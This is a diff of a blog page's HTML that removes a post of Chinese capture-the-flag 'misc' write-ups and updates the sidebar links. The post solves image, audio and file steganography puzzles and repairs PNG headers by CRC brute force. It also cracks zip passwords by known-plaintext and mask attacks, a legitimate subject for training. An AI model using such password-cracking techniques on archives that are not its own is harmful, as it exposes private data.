&#x27;w&#x27;) as new_file:</span><br><span class="line">    for j in res_list:</span><br><span class="line">        new_file.write(j)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/227.PNG?raw=true" alt="227.PNG"></p>
-<p>六万多行直接没掉了 <strong>因为wireshark是直接将十六进制导出还得转一下</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">with open(&#x27;data1.txt&#x27;,&#x27;r&#x27;) as file:</span><br><span class="line">    with open(&#x27;data2.txt&#x27;,&#x27;wb&#x27;) as data:</span><br><span class="line">        for i in file.readlines():</span><br><span class="line">            data.write(binascii.unhexlify(i[:-1]))</span><br></pre></td></tr></table></figure>
-
-<p>十六转字符<br><strong>将$$START$$ 和首末行 还有换行删掉 用word 查找替换 换行符是^p</strong><br>base64 解一下是压缩文件</p>
-<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/228.PNG?raw=true" alt="228.PNG"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">with open(&#x27;data2.txt&#x27;,&#x27;rb&#x27;) as file:</span><br><span class="line">    with open(&#x27;data.zip&#x27;,&#x27;wb&#x27;) as new_file:</span><br><span class="line">        new_file.write(base64.b64decode(file.read()))</span><br></pre></td></tr></table></figure>
-
-<p>用脚本将其转为base64在写入压缩文件中解压缩 </p>
-<p>终于看到蜘蛛侠了 然后就不会了看别人的去<br><strong>这是时间隐写 用Linux下的identify -format “%T” flag.gif</strong><br>得到这么一串<br>2050502050502050205020202050202020205050205020502050205050505050202050502020205020505050205020206666<br><strong>20-&gt;0 50-&gt;1</strong><br>011011010100010000110101010111110011000101110100  </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/247.PNG?raw=true" alt="247.PNG"></p>
-<h4 id="MRCTF2020-不眠之夜"><a href="#MRCTF2020-不眠之夜" class="headerlink" title="[MRCTF2020]不眠之夜"></a>[MRCTF2020]不眠之夜</h4><p>一堆散掉的图 拼图题 <strong>单张分辨率200*100 共120张 长10张 宽12张 拼起来总图长2000宽1200</strong><br><strong>用momtage 和gaps</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">montage *jpg -tile 10x12 -geometry 200x100+0+0 flag.jpg</span><br><span class="line">gaps --image=flag.jpg --generations=40 --population=120 --size=100</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/248.PNG?raw=true" alt="248.PNG"></p>
-<h4 id="ACTF新生赛2020-明文攻击"><a href="#ACTF新生赛2020-明文攻击" class="headerlink" title="[ACTF新生赛2020]明文攻击"></a>[ACTF新生赛2020]明文攻击</h4><p>解压缩拿到图和包 题目<strong>描述明文攻击</strong><br>图片010打开发现 末尾一段类似压缩包的在最后一个32后面添加文件头50 4B 拿到压缩包</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/249.PNG?raw=true" alt="249.PNG"></p>
-<p> 俩包CRC值是一样的</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/250.PNG?raw=true" alt="250.PNG"></p>
-<p>也说了明文攻击很明显了  用那个advanced什么的来跑就可以了</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/251.PNG?raw=true" alt="251.PNG"></p>
-<h4 id="安洵杯-2019-easy-misc"><a href="#安洵杯-2019-easy-misc" class="headerlink" title="[安洵杯 2019]easy misc"></a>[安洵杯 2019]easy misc</h4><p>read里面一大堆的英语文档 应该是存在<strong>字频隐写</strong><br>加密的压缩包打开有<strong>一段注释</strong></p>
-<p>计算得7+NNULULL 前<strong>七位可能是数字用掩码破解</strong> </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/252.PNG?raw=true" alt="252.PNG"></p>
-<p>拿到文档</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b = sSD</span><br><span class="line">c = adE </span><br><span class="line">d = jVf</span><br><span class="line">e = QW8</span><br><span class="line">f = SA=</span><br><span class="line">g = jBt</span><br><span class="line">h = 5RE</span><br><span class="line">i = tRQ</span><br><span class="line">j = SPA</span><br><span class="line">k = 8DS</span><br></pre></td></tr></table></figure>
-
-<p>  <strong>字频没错了</strong><br>小姐姐.png 010发现有<strong>两张图片分离出来</strong> 然后就不会了<br><strong>看了别人的发现是盲水印</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\bwm.py decode .\1.png .\2.png res.png</span><br><span class="line">image&lt;.\1.png&gt; + image(encoded)&lt;.\2.png&gt; -&gt; watermark&lt;res.png&gt;</span><br></pre></td></tr></table></figure>
-
-<p>拿到个图</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/253.PNG?raw=true" alt="253.PNG"></p>
-<p>然后拿11.txt的字频 hint里说<strong>取前十六个字符</strong> etaonrhisdluygw就是这几个</p>
-<h6 id="和刚才的decode-txt进行对照"><a href="#和刚才的decode-txt进行对照" class="headerlink" title="和刚才的decode.txt进行对照"></a>和刚才的<strong>decode.txt进行对照</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code_str = &#x27;etaonrhisdluygw&#x27;</span><br><span class="line">code_dict = &#123;&#x27;a&#x27;:&#x27;dIW&#x27;,&#x27;b&#x27;:&#x27;sSD&#x27;,&#x27;c&#x27;:&#x27;adE &#x27;,&#x27;d&#x27;:&#x27;jVf&#x27;,&#x27;e&#x27;:&#x27;QW8&#x27;,&#x27;f&#x27;:&#x27;SA=&#x27;,&#x27;g&#x27;:&#x27;jBt&#x27;,&#x27;h&#x27;:&#x27;5RE&#x27;,&#x27;i&#x27;:&#x27;tRQ&#x27;,&#x27;j&#x27;:&#x27;SPA&#x27;,&#x27;k&#x27;:&#x27;8DS&#x27;,&#x27;l&#x27;:&#x27;XiE&#x27;,&#x27;m&#x27;:&#x27;S8S&#x27;,&#x27;n&#x27;:&#x27;MkF&#x27;,&#x27;o&#x27;:&#x27;T9p&#x27;,&#x27;p&#x27;:&#x27;PS5&#x27;,&#x27;q&#x27;:&#x27;E/S&#x27;,&#x27;r&#x27;:&#x27;-sd&#x27;,&#x27;s&#x27;:&#x27;SQW&#x27;,&#x27;t&#x27;:&#x27;obW&#x27;,&#x27;u&#x27;:&#x27;/WS&#x27;,&#x27;v&#x27;:&#x27;SD9&#x27;,&#x27;w&#x27;:&#x27;cw=&#x27;,&#x27;x&#x27;:&#x27;ASD&#x27;,&#x27;y&#x27;:&#x27;FTa&#x27;,&#x27;z&#x27;:&#x27;AE7&#x27;&#125;</span><br><span class="line">base_str=&#x27;&#x27;</span><br><span class="line">for i in code_str:</span><br><span class="line">    i = code_dict[i]</span><br><span class="line">    base_str += i</span><br><span class="line">print(base_str)</span><br></pre></td></tr></table></figure>
-
-<p>QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE/WSFTajBtcw=</p>
-<p>去掉无效字符- 然后怎么解码都没有结果<br>看别人的wp都有 离谱玩意</p>
-<h4 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h4><p>图和包 <strong>图的红通道0拿到一张图</strong> 然后<strong>文件分离拿到压缩包</strong></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/254.PNG?raw=true" alt="254.PNG"></p>
-<h4 id="解压成功-然后out-txt都是127-255-63-191-TTL隐写"><a href="#解压成功-然后out-txt都是127-255-63-191-TTL隐写" class="headerlink" title="解压成功 然后out.txt都是127 255 63 191 TTL隐写"></a>解压成功 然后out.txt都是127 255 63 191 TTL隐写</h4><p><strong>00 替代63 01 替代127 10 替代191 11 替代255</strong><br>脚本走</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;out.txt&#x27;) as f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">n_num = []</span><br><span class="line">#分析出所有的数</span><br><span class="line">for i in lines:</span><br><span class="line">    if i!=&#x27;\n&#x27;:</span><br><span class="line">        n_num.append(int(i))</span><br><span class="line">#拿到每个TTL值的高位</span><br><span class="line">rlt = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(lines)):</span><br><span class="line">    tmp = bin(n_num[i])[2:]</span><br><span class="line">    tmp = &#x27;0&#x27;*(8-len(tmp)) + tmp</span><br><span class="line">    rlt += tmp[0:2]</span><br><span class="line">#得到最终的结果并存到文件中</span><br><span class="line">rlt2 = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(rlt),8):</span><br><span class="line">    rlt2 += chr(int(rlt[i:i+8],2))</span><br><span class="line">with open(&#x27;fi.txt&#x27;,&#x27;w&#x27;) as f:</span><br><span class="line">    f.write(rlt2.rstrip())</span><br></pre></td></tr></table></figure>
-
-<p> 拿到压缩包密码</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/255.PNG?raw=true" alt="255.PNG"></p>
-<p>解压后还是一个压缩包再解压 变成一堆的文档 <strong>有word doc 那么这个包原本应该是doc格式</strong><br>改格式可以打开<strong>然后全选换一下颜色一些base64码</strong><br>转码发现都是0和1 将所有的1换成空格</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">with open(&#x27;flag.txt&#x27;,&#x27;r&#x27;) as file:</span><br><span class="line">    for i in file.readlines():</span><br><span class="line">        line = str(base64.b64decode(i),&#x27;utf8&#x27;)</span><br><span class="line">        print(line.replace(&#x27;1&#x27;,&#x27; &#x27;))</span><br></pre></td></tr></table></figure>
-
-<p>flag 到手</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/257.PNG?raw=true" alt="257.PNG"></p>
-<h4 id="MRCTF2020-Unravel"><a href="#MRCTF2020-Unravel" class="headerlink" title="[MRCTF2020]Unravel!!"></a>[MRCTF2020]Unravel!!</h4><p>图和包标准配置 还有个音频 wav用010打开然后<strong>末尾一串类似于base64的</strong></p>
-<h4 id="解码发现是salted开头的-好aes或者des加密"><a href="#解码发现是salted开头的-好aes或者des加密" class="headerlink" title="解码发现是salted开头的 好aes或者des加密"></a><strong>解码发现是salted开头的 好aes或者des加密</strong></h4><p>图片分离一下图和压缩包 压缩包解压的到这个</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/258.PNG?raw=true" alt="258.PNG"></p>
-<p>那就是aes了 <a target="_blank" rel="noopener" href="http://www.metools.info/code/c24.html">http://www.metools.info/code/c24.html</a></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/259.PNG?raw=true" alt="259.PNG"></p>
-<h5 id="拿到解压密码-解压也是wav-丢010-末尾有一串不知道是什么的"><a href="#拿到解压密码-解压也是wav-丢010-末尾有一串不知道是什么的" class="headerlink" title="拿到解压密码 解压也是wav 丢010 末尾有一串不知道是什么的"></a>拿到解压密码 解压也是wav 丢010 末尾有一串不知道是什么的</h5><p>直接丢silenteye decode一下 ok</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/260.PNG?raw=true" alt="260.PNG"></p>
-<h4 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="WUSTCTF2020]spaceclub"></a>WUSTCTF2020]spaceclub</h4><p>全选一下就能看出东西来</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/261.PNG?raw=true" alt="261.PNG"></p>
-<h5 id="短的0长的1"><a href="#短的0长的1" class="headerlink" title="短的0长的1"></a>短的0长的1</h5><p>011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</p>
-<p><strong>二进制转字符就可以了</strong></p>
-<h4 id="派大星的烦恼"><a href="#派大星的烦恼" class="headerlink" title="派大星的烦恼"></a>派大星的烦恼</h4><p><strong>题目提示了重点在0x22 0x44</strong><br>010打开将<strong>所有的 22 44</strong> 复制出来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">infile = open(&quot;321.txt&quot;, &quot;r&quot;)</span><br><span class="line">outfile = open(&quot;312.txt&quot;, &quot;w&quot;)</span><br><span class="line">for line in infile:</span><br><span class="line">    outfile.write(line.replace(&#x27;22&#x27;,&#x27;0&#x27;))</span><br><span class="line">    #outfile.write(line.replace(&#x27;44&#x27;,&#x27;1&#x27;))</span><br><span class="line">infile.close()</span><br><span class="line">outfile.close()</span><br></pre></td></tr></table></figure>
-
-<p>然后替换一下 得到新文本<br><a target="_blank" rel="noopener" href="http://www.txttool.com/wenben_alltrim.asp">http://www.txttool.com/wenben_alltrim.asp</a>  去掉空格<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/daoxu/">https://www.qqxiuzi.cn/zh/daoxu/</a>    将文本逆序一下<br>然后二进制转字符<br><strong>再逆序一下就可以了</strong></p>
-<h4 id="湖南省赛2019-Findme"><a href="#湖南省赛2019-Findme" class="headerlink" title="[湖南省赛2019]Findme"></a>[湖南省赛2019]Findme</h4><p>首先五张图 <strong>1.png简直不是图</strong> 先解决他<br>首先crc校验就有问题</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line">import struct</span><br><span class="line">file = &#x27;1.png&#x27;</span><br><span class="line">fr = open(file,&#x27;rb&#x27;).read()</span><br><span class="line">data = bytearray(fr[12:29])</span><br><span class="line">crc32key = 0xC4ED3  </span><br><span class="line">n = 4095 </span><br><span class="line">for w in range(n): </span><br><span class="line">    width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))</span><br><span class="line">    for h in range(n): </span><br><span class="line">        height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) </span><br><span class="line">        for x in range(4): </span><br><span class="line">            data[x+4] = width[x] </span><br><span class="line">            data[x+8] = height[x] </span><br><span class="line">            #print(data) </span><br><span class="line">        crc32result = zlib.crc32(data) </span><br><span class="line">        if crc32result == crc32key: </span><br><span class="line">            print(width,height) </span><br><span class="line">            print(data) </span><br><span class="line">            newpic = bytearray(fr) </span><br><span class="line">            for x in range(4): </span><br><span class="line">                newpic[x+16] = width[x]</span><br><span class="line">                newpic[x+20] = height[x] </span><br><span class="line">            fw = open(file+&#x27;.png&#x27;,&#x27;wb&#x27;) </span><br><span class="line">            fw.write(newpic) </span><br><span class="line">            fw.close </span><br></pre></td></tr></table></figure>
-
-<p>用脚本修复一下 然后<strong>提示chunk[2][3]提示有问题发现缺了IDAT</strong><br>添加一下</p>
-<p>拿到原图 </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/262.PNG?raw=true" alt="262.PNG"></p>
-<p>拿到二维码</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/263.PNG?raw=true" alt="263.PNG"></p>
-<p><strong>获得如下内容ZmxhZ3s0X3</strong></p>
-<p><strong>2.png 文件末尾的37 7A 03 04 这个和zip的50 4B 03 04 的文件头有点像</strong></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/264.PNG?raw=true" alt="264.PNG"></p>
-<p>修改试一下 <strong>改一个还不行</strong></p>
-<p>得<strong>全部改掉改成PK</strong></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/265.PNG?raw=true" alt="265.PNG"></p>
-<p>解压得到<strong>大量文档按大小排</strong>618.txt不太对劲 <strong>You find it: 1RVcmVfc 第二串</strong></p>
-<h6 id="3-png"><a href="#3-png" class="headerlink" title="**3.png **"></a>**3.png **</h6><h5 id="它的crc值和其他人不太一样-抓出来转成字符一下看看"><a href="#它的crc值和其他人不太一样-抓出来转成字符一下看看" class="headerlink" title="它的crc值和其他人不太一样 抓出来转成字符一下看看"></a><strong>它的crc值和其他人不太一样</strong> 抓出来转成字符一下看看</h5><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/267.PNG?raw=true" alt="267.PNG"></p>
-<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/268.PNG?raw=true" alt="268.PNG" style="zoom:50%;" />
-
-<p><strong>3RlZ30= 第三串</strong></p>
-<h6 id="4-png"><a href="#4-png" class="headerlink" title="4.png"></a>4.png</h6><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/269.PNG?raw=true" alt="269.PNG"></p>
-<p><strong>cExlX1BsY=</strong></p>
-<h6 id="5-png"><a href="#5-png" class="headerlink" title="5.png"></a>5.png</h6><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/270.PNG?raw=true" alt="270.PNG"></p>
-<h5 id="Yzcllfc0lN"><a href="#Yzcllfc0lN" class="headerlink" title="Yzcllfc0lN"></a>Yzcllfc0lN</h5><p><strong>1 5 4 2 3 组合</strong></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/271.PNG?raw=true" alt="271.PNG"></p>
-<h4 id="ACTF新生赛2020-music"><a href="#ACTF新生赛2020-music" class="headerlink" title="[ACTF新生赛2020]music"></a>[ACTF新生赛2020]music</h4><p>说是m4a格式 但是打不开啊 ╮(╯▽╰)╭<br>010和正经的m4a对比一下 </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/276.PNG?raw=true" alt="276.PNG"></p>
-<p><strong>左边正常 右边这题给的文件</strong></p>
-<h5 id="很多的A1-用010的十六进制计算工具将所有的A1进行异或"><a href="#很多的A1-用010的十六进制计算工具将所有的A1进行异或" class="headerlink" title="很多的A1 用010的十六进制计算工具将所有的A1进行异或"></a>很多的A1 用010的十六进制计算工具将所有的A1进行异或</h5><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/277.PNG?raw=true" alt="277.PNG"></p>
-<p>就拿到原本的文件了</p>
-<p>听出flag</p>
-<h5 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h5><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/278.PNG?raw=true" alt="278.PNG"></p>
-<p>提示gbk什么的 然后题目也说了zero 零 (・∀・(・∀・(・∀・*)<br>有个玩意叫做零宽度字符隐写<br><a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a><br>就能拿到flag </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/09/page-115/" data-id="ckuzhneyf000hv4w735qgbgtl" data-title="又是misc" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1054,7 +985,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -1067,6 +998,14 @@
       <ul>
         
           <li>
+            <a href="/2022/08/21/page-129/">ISCC复现</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/21/page-128/">巅峰极客easy_Forensic</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/20/page-127/">web点2</a>
           </li>
         
@@ -1076,14 +1015,6 @@
         
           <li>
             <a href="/2021/10/20/page-125/">杂项杂项</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
           </li>
         
       </ul>
